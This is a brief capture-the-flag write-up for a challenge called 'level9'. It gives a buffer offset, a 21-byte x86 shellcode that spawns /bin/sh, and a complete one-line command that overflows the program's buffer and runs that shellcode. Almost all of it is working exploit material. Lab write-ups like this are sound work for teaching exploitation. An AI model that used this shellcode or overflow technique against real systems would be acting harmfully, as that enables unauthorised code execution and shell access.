# level9

In this level, we will do a shellcode injection.

According to the [gdb explains](gdbwriteup.md), we can find the offset of the buffer and the size that we will need for our shellcode.

-------------------------
| offset                    | 108                                                                                   |
|---------                  |-                                                                                      |
|shellcode size             | 21                                                                                    |
|shellcode                  | \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80  |
| address of the string     | 0x0804a00c
-----------------------

For our script, we will use this format:

```bash
 address of the string + 4 + shellcode + (OFFSET - shellcode size - 4) + address of the string
```

```bash
./level9 $(python -c "print( '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'B' * 83 + '\x0c\xa0\x04\x08')")
```